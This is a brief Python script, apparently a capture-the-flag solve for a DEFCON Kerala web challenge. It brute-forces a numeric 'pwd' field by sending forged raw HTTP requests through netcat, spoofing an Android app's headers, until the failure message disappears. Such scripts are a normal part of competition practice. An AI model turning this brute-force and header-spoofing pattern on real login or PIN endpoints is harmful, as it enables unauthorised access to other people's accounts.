a = """POST /web/300/update.php HTTP/1.1
Host: challenges.defconkerala.com
Connection: keep-alive
Content-Length: %d
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
User-Agent: Mozilla/5.0 (Linux; Android 4.4; sdk Build/KRT16L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36
content-type: application/x-www-form-urlencoded
Accept-Encoding: gzip,deflate
Accept-Language: en-US
X-Requested-With: com.example.defkthonapp

pwd=%d&imei=000000000000000&div=89014103211118510720"""

import os

for i in range(0, 300):
	f = open('req', 'w')
	x = a % (50+len(str(i)), i)
	f.write(x)
	f.close()
	res= os.popen("cat req | nc challenges.defconkerala.com 80").read()
	if res.find("You missed something.")==-1:
		print res
		break
